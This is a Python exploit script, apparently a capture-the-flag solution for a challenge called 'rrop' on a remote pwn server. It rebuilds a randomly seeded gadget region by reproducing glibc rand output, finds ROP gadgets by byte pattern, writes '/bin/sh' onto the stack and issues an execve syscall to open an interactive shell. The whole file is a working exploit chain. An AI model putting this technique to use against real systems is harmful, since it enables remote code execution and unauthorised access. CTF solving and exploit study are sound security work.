from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')

seed = 7282

#sock = Process("./chall")
sock = Socket("rrop-01.pwn.beer", 45243)
sock.sendlineafter("seed: ", str(seed))
sock.recvuntil("addr: ")
rop_base = int(sock.recvline(), 16)
logger.info("rop base = " + hex(rop_base))

glibc.srand(seed)
gadgets = b''
for j in range(0x2000):
    gadgets += p32(glibc.rand())
rop_pop_rax = rop_base + gadgets.index(b'\x58\xc3')
rop_pop_rdi = rop_base + gadgets.index(b'\x5f\xc3')
rop_ret = rop_base + gadgets.index(b'\xc3')
rop_mov_rdi_rsp = rop_base + gadgets.index(b'\x54\x5f\xc3')
rop_syscall = rop_base + gadgets.index(b'\x0f\x05')
rop_stosd = rop_base + 0x000000000000746a
rop_std = rop_base + 0x000000000000690d
rop_cld = rop_base + 0x00000000000023d4

def mov_rdi_rsp():
    payload  = p64(rop_ret) * 8
    payload += p64(rop_mov_rdi_rsp)
    return payload

def write_to_stack(val):
    payload  = p64(rop_pop_rax)
    payload += p64(val)
    payload += p64(rop_std)
    payload += p64(rop_stosd)
    return payload

payload = b''
payload += mov_rdi_rsp()

string = b'/bin/sh\x00'
for i in range(0, len(string), 4):
    payload += write_to_stack(u32(string[len(string) - i - 4:len(string) - i]))
payload += p64(rop_cld)
payload += p64(rop_stosd)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
payload += p64(0xffffffffffffffff)
sock.sendafter("rrop: ", payload)

sock.interactive()
